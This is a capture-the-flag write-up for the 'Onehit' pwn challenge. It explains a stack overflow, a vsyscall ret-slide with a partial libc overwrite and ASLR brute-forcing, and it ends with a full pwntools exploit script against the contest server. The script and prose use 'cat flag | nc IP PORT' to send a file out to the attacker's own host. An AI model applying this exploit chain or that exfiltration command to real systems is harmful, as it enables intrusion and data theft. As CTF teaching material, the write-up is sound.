# Write up for "Onehit" challenge - pwn 03 

## Skimming through to find the bug!

So, first thing we did was to open up the binary in IDA, we quickly noticed that there a function called `Echo()` that calls `read()` with an un-initialized value as the `count` (amount of bytes to read).

This leads to a stack-based buffer overflow!

## Stack Overflow --> Code Execution ?

So, after finding the bug, we also noticed there were **no** leaks whatsoever. After getting stuck for a while, we remembered a trick that used `vsyscall` for gadgets!

For those of you who don't know, `vsyscall` is always mapped to the same address. 

The binary was running a "custom" libc, that had an additional gadget that basically did:

```
add rdi, 127
jmp system
```

At the moment that we control the return-address, `rdi` points to somewhere inside our input. It is important to state that **before** we overwrite the return address, there is a call to `strcpy()` which "trashes" the value of rdi with a NULL terminated string -- this prevented us from just simply jumping to a `system()` gadget that was already present in the binary.

After we had control over the argument to `system()`, because `stdin` and `stdout` were both closed, we just executed the following command to get the flag:
`cat flag | nc IP PORT` (where IP and PORT are the IP of our server, and the port we were listening to).

## The vsyscall trick

So, you must be wondering "What vsyscall trick is he talking about...?" -- So there it is!

As the libc was patched, and added an extra, super-useful gadget, we **had** to use that gadget in order to get a shell.

After debugging a bit, we ntoiced that in offset 30 QWORDs (30 * 8 bytes) from the return address (including the return-address), there was a libc address in the stack.

Using the fact that `vsyscall` is **always** mapped to the same address, we can use some of it's gadgets!

We can't just jump into a middle of a vsyscall, so we have to perform a "whole" vsyscall, but the general idea is to use the `ret` instruction of a `vsyscall` to just "slide through" the stack until we reach a libc-address, and then we **only partiall overwrite it**.

This is the `vsyscall` gadget we decided to use:

```
   0xffffffffff600400:    mov    rax,0xc9
   0xffffffffff600407:    syscall
   0xffffffffff600409:    ret
```

## Breaking ASLR ?

Even though we have bypassed *most* of the ASLR randomization, there are still 12 bits that we don't know for sure after overwriting the 3 least significant nibbles (12 least significant bits) of the libc address -- the way we bypassed ASLR is by relying on a statistical factor, we ran the exploit for quite some time until we landed with a "good" ASLR base guess.


## Finalizing the exploit

So, to sum things up we have the following points to finish up our exploit:

1. Overwrite the stack from the return address (including) with 30 QWORDs that hold the address `0xffffffffff600400`, this will allow us to "slide" through the stack until we reach a libc address.

2. Make sure that when we start jumping to the `vsyscall` "slide", `rdi+127` holds the string `"cat flag | nc IP PORT"` (this is easily done because `rdi+127` is controlled by us!).

3. Once we read the libc address, overwrite it partially with 3 bytes - these 3 bytes will be the 3 least significant bytes of the "patched-in" gadgets, which will finally execute: `system(rdi+127)` which is `system("/bin/sh")`.

4. Profit!

## Exploit Code

*Note: this exploit works with a statistical factor*

The flag was: `WhiteHat{6c6edbd044176a913a1ed34661a37e836848f066}`

```Python
import hashlib
import os
import time

def solve(pre, sice):
    for i in range(0x100000):
        if hashlib.sha512( pre + str(i)).hexdigest().startswith(sice):
            return i
    return -1

from pwn import *

proc = remote("pwn03.grandprix.whitehatvn.com", 2023)

proc.recvuntil("sha512(\"")
pre = proc.recvuntil('"').strip('"')
proc.recvuntil("0x")
pow_chall = proc.recvuntil("...").strip("...").strip("0x")
solution = solve(pre, pow_chall)
proc.recvuntil(" =")
proc.sendline(str(solution) + "\x00" + "A"*(77-len(str(solution))-1))

proc.recvuntil("al?")
proc.send("N0")

proc.recvuntil("/sh")
proc.sendline("1")

# an address that exists: 0x7ffff7a05b97 an address we need 0x7ffff7a3343e
vsyscall = p64(0xffffffffff600400)
count = 30

send_flag = 'cat flag | nc IP PORT\x00' # we censored our IP and PORT

leftover = (232-143-len(send_flag))
proc.send(cyclic(143) +send_flag+ 'A'*leftover+vsyscall*count + '\x3a\x34\xa3') # RIP control :P
proc.interactive()
```
